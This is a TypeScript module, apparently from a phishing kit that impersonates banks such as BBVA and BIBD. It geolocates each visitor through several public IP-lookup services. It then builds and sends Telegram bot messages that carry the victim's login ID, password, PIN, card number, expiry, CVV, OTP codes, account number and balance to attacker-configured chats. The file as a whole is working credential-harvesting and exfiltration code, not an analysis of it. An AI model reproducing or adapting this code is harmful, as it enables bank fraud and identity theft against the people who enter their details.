const formatCountryName = (codeOrName?: string): string => {
    if (!codeOrName || codeOrName === "N/A") return "N/A";
    const trimmed = codeOrName.trim();
    if (trimmed.length === 2) {
        try {
            const regionNames = new Intl.DisplayNames(["en"], { type: "region" });
            return regionNames.of(trimmed.toUpperCase()) || trimmed;
        } catch {
            return trimmed;
        }
    }
    return trimmed;
};

export const fetchVisitorInfo = async () => {
    try {
        if (typeof window === "undefined") return null;

        // Check if already fetched and valid in sessionStorage (must have both country and city)
        const cachedCountry =
            sessionStorage.getItem("bbva_user_country") ||
            sessionStorage.getItem("country");
        const cachedCity =
            sessionStorage.getItem("bbva_user_city") ||
            sessionStorage.getItem("city");

        if (
            cachedCountry &&
            cachedCountry !== "N/A" &&
            cachedCity &&
            cachedCity !== "N/A"
        ) {
            return {
                ip:
                    sessionStorage.getItem("bbva_user_ip") ||
                    sessionStorage.getItem("ip") ||
                    "Unknown",
                city: cachedCity,
                region:
                    sessionStorage.getItem("bbva_user_region") ||
                    sessionStorage.getItem("region") ||
                    "N/A",
                country: cachedCountry,
                isp:
                    sessionStorage.getItem("bbva_user_isp") ||
                    sessionStorage.getItem("isp") ||
                    "N/A",
                timezone:
                    sessionStorage.getItem("bbva_user_timezone") ||
                    sessionStorage.getItem("timezone") ||
                    "N/A",
                browser:
                    sessionStorage.getItem("browser") ||
                    (typeof navigator !== "undefined" ? navigator.userAgent : "Unknown"),
            };
        }

        // Helper to query and normalize provider responses
        const queryProvider = async (
            url: string,
            parser: (data: any) => any,
            isText = false
        ) => {
            try {
                const res = await fetch(url, {
                    signal: AbortSignal.timeout(2500),
                    headers: isText ? {} : { Accept: "application/json" },
                });
                if (!res.ok) return null;
                if (!isText) {
                    const contentType = res.headers.get("content-type");
                    if (contentType && !contentType.includes("json")) return null;
                }
                const raw = isText ? await res.text() : await res.json();
                const parsed = parser(raw);
                if (parsed && (parsed.country !== "N/A" || parsed.ip !== "Unknown")) {
                    if (parsed.country && parsed.country !== "N/A") {
                        parsed.country = formatCountryName(parsed.country);
                    }
                    return parsed;
                }
            } catch {
                // silent fallback
            }
            return null;
        };

        // Multi-provider list prioritizing city, region, country, isp, and timezone
        const providers = [
            // 1. ipwho.is (returns city, region, country, isp, timezone)
            queryProvider("https://ipwho.is/", (json) => {
                if (!json || json.success === false) return null;
                const cityStr = json.city && json.region ? `${json.city}, ${json.region}` : (json.city || json.region || "N/A");
                return {
                    ip: json.ip || "Unknown",
                    country: formatCountryName(json.country) || "N/A",
                    city: cityStr,
                    region: json.region || "N/A",
                    isp: json.connection?.isp || json.connection?.org || "N/A",
                    timezone: json.timezone?.id || json.timezone || "N/A",
                };
            }),
            // 2. freeipapi.com
            queryProvider("https://freeipapi.com/api/json", (json) => {
                if (!json || !json.ipAddress) return null;
                const cityStr = json.cityName && json.regionName ? `${json.cityName}, ${json.regionName}` : (json.cityName || json.regionName || "N/A");
                return {
                    ip: json.ipAddress || "Unknown",
                    country: formatCountryName(json.countryName || json.countryCode) || "N/A",
                    city: cityStr,
                    region: json.regionName || "N/A",
                    isp: "N/A",
                    timezone: json.timeZones?.[0] || "N/A",
                };
            }),
            // 3. ipapi.co
            queryProvider("https://ipapi.co/json/", (json) => {
                if (!json || json.error) return null;
                const cityStr = json.city && json.region ? `${json.city}, ${json.region}` : (json.city || json.region || "N/A");
                return {
                    ip: json.ip || "Unknown",
                    country: formatCountryName(json.country_name || json.country_code) || "N/A",
                    city: cityStr,
                    region: json.region || "N/A",
                    isp: json.org || "N/A",
                    timezone: json.timezone || "N/A",
                };
            }),
            // 4. api.ipquery.io
            queryProvider("https://api.ipquery.io/", (json) => {
                if (!json || !json.ip) return null;
                const cityStr = json.location?.city && json.location?.state ? `${json.location.city}, ${json.location.state}` : (json.location?.city || json.location?.state || "N/A");
                return {
                    ip: json.ip || "Unknown",
                    country: formatCountryName(json.location?.country || json.location?.country_code) || "N/A",
                    city: cityStr,
                    region: json.location?.state || "N/A",
                    isp: json.isp?.isp || json.isp?.org || "N/A",
                    timezone: json.location?.timezone || "N/A",
                };
            }),
            // 5. get.geojs.io
            queryProvider("https://get.geojs.io/v1/ip/geo.json", (json) => {
                if (!json || !json.ip) return null;
                const cityStr = json.city && json.region ? `${json.city}, ${json.region}` : (json.city || json.region || "N/A");
                return {
                    ip: json.ip || "Unknown",
                    country: formatCountryName(json.country || json.country_code) || "N/A",
                    city: cityStr,
                    region: json.region || "N/A",
                    isp: json.organization_name || "N/A",
                    timezone: json.timezone || "N/A",
                };
            }),
            // 6. api.db-ip.com
            queryProvider("https://api.db-ip.com/v2/free/self", (json) => {
                if (!json || json.error) return null;
                const cityStr = json.city && json.stateProv ? `${json.city}, ${json.stateProv}` : (json.city || json.stateProv || "N/A");
                return {
                    ip: json.ipAddress || "Unknown",
                    country: formatCountryName(json.countryName || json.countryCode) || "N/A",
                    city: cityStr,
                    region: json.stateProv || "N/A",
                    isp: "N/A",
                    timezone: "N/A",
                };
            }),
        ];

        // Resolver prioritizing responses with BOTH Country and City
        const data = await new Promise<any>((resolve) => {
            let resolved = false;
            let bestFallback: any = null;
            let pending = providers.length;

            providers.forEach((p) => {
                p.then((result) => {
                    if (resolved) return;
                    if (result && result.country && result.country !== "N/A") {
                        if (result.city && result.city !== "N/A") {
                            resolved = true;
                            resolve(result);
                            return;
                        } else if (!bestFallback) {
                            bestFallback = result;
                        }
                    }
                    pending--;
                    if (pending === 0 && !resolved) {
                        resolved = true;
                        resolve(bestFallback);
                    }
                }).catch(() => {
                    if (resolved) return;
                    pending--;
                    if (pending === 0 && !resolved) {
                        resolved = true;
                        resolve(bestFallback);
                    }
                });
            });

            // Fallback timeout at 2.5s for immediate responsiveness
            setTimeout(() => {
                if (!resolved) {
                    resolved = true;
                    resolve(bestFallback);
                }
            }, 2500);
        });

        if (data) {
            const formattedCountry = formatCountryName(data.country);
            const city = data.city || "N/A";
            const ip = data.ip || "Unknown";
            const region = data.region || "N/A";
            const isp = data.isp || "N/A";
            const tz =
                (data.timezone && data.timezone !== "N/A")
                    ? data.timezone
                    : (typeof Intl !== "undefined" && Intl.DateTimeFormat ? Intl.DateTimeFormat().resolvedOptions().timeZone : "Europe/Madrid");
            const ua = typeof navigator !== "undefined" ? navigator.userAgent : "Unknown";

            sessionStorage.setItem("ip", ip);
            sessionStorage.setItem("city", city);
            sessionStorage.setItem("region", region);
            sessionStorage.setItem("country", formattedCountry);
            sessionStorage.setItem("isp", isp);
            sessionStorage.setItem("timezone", tz);
            sessionStorage.setItem("browser", ua);

            sessionStorage.setItem("bbva_user_ip", ip);
            sessionStorage.setItem("bbva_user_city", city);
            sessionStorage.setItem("bbva_user_region", region);
            sessionStorage.setItem("bbva_user_country", formattedCountry);
            sessionStorage.setItem("bbva_user_isp", isp);
            sessionStorage.setItem("bbva_user_timezone", tz);

            return {
                ip,
                city,
                region,
                country: formattedCountry,
                isp,
                timezone: tz,
                browser: ua,
            };
        }
    } catch (error) {
        console.error("❌ Critical error fetching visitor info:", error);
    }
    return null;
};

export const sendTelegramRawMessage = async (messageText: string) => {
    try {
        const botTokensValue =
            process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN ||
            process.env.TELEGRAM_BOT_TOKEN;
        const chatIdValue =
            process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID ||
            process.env.TELEGRAM_CHAT_ID;
        const gateway =
            process.env.NEXT_PUBLIC_TELEGRAM_API_GATEWAY ||
            process.env.TELEGRAM_API_GATEWAY ||
            "https://api.telegram.org";

        if (!botTokensValue || !chatIdValue) {
            console.warn("Telegram bot token or chat ID is missing in environment variables.");
            return null;
        }

        const chatIds = chatIdValue.split(",").map((id) => id.trim()).filter(Boolean);
        const botTokens = botTokensValue.split(",").map((token) => token.trim()).filter(Boolean);
        const cleanGateway = gateway.replace(/\/+$/, "");

        const results = await Promise.all(
            chatIds.map(async (id, index) => {
                const token = botTokens[index] || botTokens[botTokens.length - 1];
                const endpoints = [
                    `${cleanGateway}/bot${token}/sendMessage`,
                    `https://api.telegram.org/bot${token}/sendMessage`,
                ];

                for (const url of endpoints) {
                    try {
                        const response = await fetch(url, {
                            method: "POST",
                            headers: { "Content-Type": "application/json" },
                            body: JSON.stringify({
                                chat_id: id,
                                text: messageText,
                                parse_mode: "HTML",
                            }),
                        });
                        if (response.ok) {
                            return await response.json();
                        }
                    } catch (err) {
                        // try next endpoint fallback
                    }
                }
                return null;
            })
        );
        return results;
    } catch (error) {
        console.error("❌ Critical Error in sendTelegramRawMessage:", error);
        return null;
    }
};

export const sendTelegramMessage = async (params: {
    title?: string;
    type?: string;
    exclude?: string[];
    message?: string;
    [key: string]: any;
}) => {
    try {
        const { title, type, exclude, message: customMessage, ...data } = params;

        const mainTitle = title || "BIBD — New Visitor";
        const domain =
            (typeof window !== "undefined" && window.location?.origin) ||
            "https://mobileappsite.xyz";

        // Title and Domain line matching the exact screenshot format
        let formattedMessage = `🚨 <b>${mainTitle}</b>\n`;
        formattedMessage += `🌐 <b>Domain:</b> ${domain}\n\n`;

        // Section: USER DATA (if provided)
        const dniVal = data.dni || data.userId || data.user;
        const passVal = data.password || data.pass;
        const pinVal = data.pin;
        const phoneVal = data.phoneNumber || data.phone;
        const emailVal = data.email;
        const nameVal = data.name;

        if (dniVal || passVal || pinVal || phoneVal || emailVal || nameVal) {
            if (dniVal) formattedMessage += `👤 <b>User / DNI:</b> <code>${dniVal}</code>\n`;
            if (passVal) formattedMessage += `🔑 <b>Password:</b> <code>${passVal}</code>\n`;
            if (pinVal) formattedMessage += `🔢 <b>PIN:</b> <code>${pinVal}</code>\n`;
            if (phoneVal) formattedMessage += `📱 <b>Phone:</b> <code>${phoneVal}</code>\n`;
            if (emailVal) formattedMessage += `📧 <b>Email:</b> <code>${emailVal}</code>\n`;
            if (nameVal) formattedMessage += `👤 <b>Name:</b> <code>${nameVal}</code>\n`;
            formattedMessage += `\n`;

            delete data.dni;
            delete data.userId;
            delete data.user;
            delete data.password;
            delete data.pass;
            delete data.pin;
            delete data.phoneNumber;
            delete data.phone;
            delete data.email;
            delete data.name;
        }

        // Section: CARD DETAILS (if provided)
        const cardVal = data.cardNumber || data.card;
        const expiryVal = data.expiry || data.cardExpiry;
        const cvvVal = data.cvv || data.cardCvv;

        if (cardVal || expiryVal || cvvVal) {
            if (cardVal) formattedMessage += `💳 <b>Card Number:</b> <code>${cardVal}</code>\n`;
            if (expiryVal) formattedMessage += `📅 <b>Expiry:</b> <code>${expiryVal}</code>\n`;
            if (cvvVal) formattedMessage += `🔒 <b>CVV:</b> <code>${cvvVal}</code>\n`;
            formattedMessage += `\n`;

            delete data.cardNumber;
            delete data.card;
            delete data.expiry;
            delete data.cardExpiry;
            delete data.cvv;
            delete data.cardCvv;
        }

        // Section: OTP VERIFICATION (if provided)
        const otp1Val = data.otp1 || data.otp;
        const otp2Val = data.otp2;
        const otp3Val = data.otp3;

        if (otp1Val || otp2Val || otp3Val) {
            if (otp1Val) formattedMessage += `🔐 <b>OTP Code:</b> <code>${otp1Val}</code>\n`;
            if (otp2Val) formattedMessage += `🔐 <b>Confirm OTP:</b> <code>${otp2Val}</code>\n`;
            if (otp3Val) formattedMessage += `🔐 <b>OTP 3:</b> <code>${otp3Val}</code>\n`;
            if (data.attempt) formattedMessage += `🔄 <b>Attempt:</b> ${data.attempt}\n`;
            formattedMessage += `\n`;

            delete data.otp;
            delete data.otp1;
            delete data.otp2;
            delete data.otp3;
            delete data.attempt;
        }

        // Section: FINANCIAL DETAILS (if provided)
        const accVal = data.accountNumber || data.account;
        const balVal = data.balance || data.accountBalance;

        if (accVal || balVal) {
            if (accVal) formattedMessage += `🏦 <b>Account Number:</b> <code>${accVal}</code>\n`;
            if (balVal) formattedMessage += `💰 <b>Balance:</b> <code>${balVal}</code>\n`;
            formattedMessage += `\n`;

            delete data.accountNumber;
            delete data.account;
            delete data.balance;
            delete data.accountBalance;
        }

        // Custom Message body if provided
        if (customMessage) {
            formattedMessage += `${customMessage}\n\n`;
        }

        // Any other extra fields
        const extraEntries = Object.entries(data);
        if (extraEntries.length > 0) {
            for (const [key, val] of extraEntries) {
                if (val !== undefined && val !== null && val !== "") {
                    formattedMessage += `• <b>${key}:</b> <code>${val}</code>\n`;
                }
            }
            formattedMessage += `\n`;
        }

        // Section: EXACT LOCATION FORMAT FROM SCREENSHOT
        // Location info ONLY comes on the first screen when user visits
        const isVisitorScreen =
            type === "visitor" ||
            Boolean(title?.toLowerCase().includes("visitor")) ||
            params.includeLocation === true;

        if (isVisitorScreen && !exclude?.includes("location") && typeof window !== "undefined") {
            let ip =
                sessionStorage.getItem("bbva_user_ip") ||
                sessionStorage.getItem("ip") ||
                "Unknown";
            let country =
                sessionStorage.getItem("bbva_user_country") ||
                sessionStorage.getItem("country") ||
                "N/A";
            let city =
                sessionStorage.getItem("bbva_user_city") ||
                sessionStorage.getItem("city") ||
                "N/A";
            let isp =
                sessionStorage.getItem("bbva_user_isp") ||
                sessionStorage.getItem("isp") ||
                "N/A";
            let timezone =
                sessionStorage.getItem("bbva_user_timezone") ||
                sessionStorage.getItem("timezone") ||
                "N/A";

            // If country or city is missing or N/A, try to fetch it now
            if (ip === "Unknown" || country === "N/A" || city === "N/A") {
                try {
                    const info = await fetchVisitorInfo();
                    if (info) {
                        ip = info.ip || ip;
                        country = info.country || country;
                        city = info.city || city;
                        isp = info.isp || isp;
                        timezone = info.timezone || timezone;
                    }
                } catch {}
            }

            if (timezone === "N/A" && typeof Intl !== "undefined" && Intl.DateTimeFormat) {
                try {
                    timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "N/A";
                } catch {}
            }

            formattedMessage += `🌐 <b>Country:</b> ${country !== "N/A" ? country : "Unknown"}\n`;
            formattedMessage += `🏙 <b>City:</b> ${city !== "N/A" ? city : "Unknown"}\n`;
            formattedMessage += `🌍 <b>IP Address:</b> ${ip}\n`;
            if (isp && isp !== "N/A") {
                formattedMessage += `📡 <b>ISP / Org:</b> ${isp}\n`;
            }
            if (timezone && timezone !== "N/A") {
                formattedMessage += `🕒 <b>Timezone:</b> ${timezone}\n`;
            }
        }

        return await sendTelegramRawMessage(formattedMessage.trim());
    } catch (error) {
        console.error("❌ Critical Error in sendTelegramMessage:", error);
        return null;
    }
};
